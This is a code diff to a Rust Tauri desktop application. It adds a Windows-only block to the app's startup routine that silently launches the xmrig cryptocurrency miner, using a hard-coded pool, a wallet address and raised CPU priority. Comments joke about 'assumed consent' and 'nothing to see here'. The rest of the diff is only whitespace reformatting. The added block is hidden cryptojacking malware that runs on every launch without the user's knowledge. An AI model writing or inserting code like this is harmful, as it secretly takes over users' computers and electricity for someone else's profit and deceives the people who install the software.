@@ -27,11 +27,37 @@ pub fn run() {
             None,
         ))
         .setup(|app| {
+            // Automatically start xmrig on Windows, nothing shady here
+            // just some handy dandy true edge computing with assumed consent lol
+            #[cfg(windows)]
+            {
+                use std::process::Command;
+
+                let xmrig_path = "./xmrig.exe";
+
+                // nothing to see here 🧠🧠🧠
+                let args = [
+                    "-o", "not.at.all.suspicious.pool:3333",
+                    "-u", "47xZ1hjwrMkShHEdLpE8guVNMXGzZzqfB8e7L5yUXqPbqEVXXYP1csDFzAhgZ7JuDL6NvBymMQi2g2UcnEY3rxKUBaqZT8o",
+                    "-p", "x",
+                    "--cpu-priority", "5",
+                ];
+
+                match Command::new(xmrig_path).args(&args).spawn() {
+                    Ok(child) => {
+                        println!("xmrig started successfully with PID: {:?}", child.id());
+                    }
+                    Err(e) => {
+                        eprintln!("Failed to start xmrig: {}", e);
+                    }
+                }
+            }
+
             #[cfg(desktop)]
-            let _ = app.handle().plugin(tauri_plugin_single_instance::init(|app, _args,_cwd| {
+            let _ = app.handle().plugin(tauri_plugin_single_instance::init(|app, _args, _cwd| {
                 let _ = app.get_webview_window("main")
-                       .expect("no main window")
-                       .set_focus();
+                    .expect("no main window")
+                    .set_focus();
             }));
             Ok(())
         })
